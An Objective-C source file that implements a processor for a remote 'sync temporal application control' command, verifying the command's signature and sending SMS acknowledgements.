//
//  SyncTemporalApplicationControlProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 3/16/2558 BE.
//
//

#import "SyncTemporalApplicationControlProcessor.h"



@interface SyncTemporalApplicationControlProcessor (PrivateAPI)
- (void) processSyncTemporalApplicationControl;
- (void) acknowldgeMessage;
- (void) syncTemporalApplicationControlException;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete;
- (void) processFinished;
@end


@implementation SyncTemporalApplicationControlProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the SyncTemporalApplicationControlProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: No return type
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"SyncTemporalApplicationControlProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}



#pragma mark RemoteCmdProcessor Methods


/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SyncTemporalApplicationControlProcessor
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
    DLog (@"SyncTemporalApplicationControlProcessor--->doProcessingCommand");
    
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
                                  numberOfMinimumCompulsoryTag:2]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"SyncTemporalApplicationControlProcessor"
												  reason:@"Failed signature check"];
	}
	
	[self processSyncTemporalApplicationControl];
}


#pragma mark RequestTemporalApplicationControlProcessor Private Mehods


/**
 - Method name: processSyncTemporalApplicationControl
 - Purpose:This method is used to process SyncTemporalApplicationControlProcessor
 - Argument list and description: No argument
 - Return description:No return type
 */

- (void) processSyncTemporalApplicationControl {
	DLog (@"SyncTemporalApplicationControlProcessor--->processSyncTemporalApplicationControl");
    // Request Temporal Control
    id <TemporalControlManager> temporalControlManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mTemporalControlManager];
    
    BOOL isReady = [temporalControlManager requestTemporalControl:self];
    
    if (!isReady) {
        DLog (@"!!! not ready to process SyncTemporalApplicationControlProcessor command")
		[self syncTemporalApplicationControlException];
    } else {
       	DLog (@".... processing SyncTemporalApplicationControlProcessor command");
        [self acknowldgeMessage];
    }
}

/**
 - Method name:			syncTemporalApplicationControlException
 - Purpose:				This method is invoked when it fails to sync temporal application control
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) syncTemporalApplicationControlException {
	DLog (@"SyncTemporalApplicationControlProcessor ---> syncTemporalApplicationControlException");
	FxException* exception = [FxException exceptionWithName:@"syncTemporalApplicationControlException" andReason:@"Sync Temporal Control Applications error"];
	[exception setErrorCode:kTemporalControlManagerBusy];
	[exception setErrorCategory:kFxErrorRCM];
	@throw exception;
}


/**
 - Method name: acknowldgeMessage
 - Purpose:		This method is used to prepare acknowldge message
 - Argument list and description:	No Argument
 - Return description:				No Return
 */

- (void) acknowldgeMessage {
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *ackMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kSyncTemporalApplicationControlMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"SyncTemporalApplicationControlProcessor--->sendReplySMS");
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	}
	else {
		DLog (@"Sent acknowldge message.");
	}
}


/**
 - Method name: processFinished
 - Purpose:This method is invoked when SyncTemporalApplicationControlProcessor is completed
 - Argument list and description:No Argument
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"SyncTemporalApplicationControlProcessor--->processFinished");
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}


#pragma mark TemporalControlDelegate methods

- (void) requestTemporalControlCompleted: (NSError *) aError {
    
}

- (void) syncTemporalControlCompleted: (NSError *) aError {
    DLog(@"SyncTemporalApplicationControlProcessor--->sync temporal control completed.")
    NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *ackMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kSyncTemporalApplicationControlMSG2", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:YES];
}


 
/**
- Method name: dealloc
- Purpose:This method is used to Handle Memory managment
- Argument list and description:No Argument
- Return description: No Return Type
*/

- (void) dealloc {
	DLog (@"dealloc of Request Temporal Application Control Manager");
	[super dealloc];
}


@end
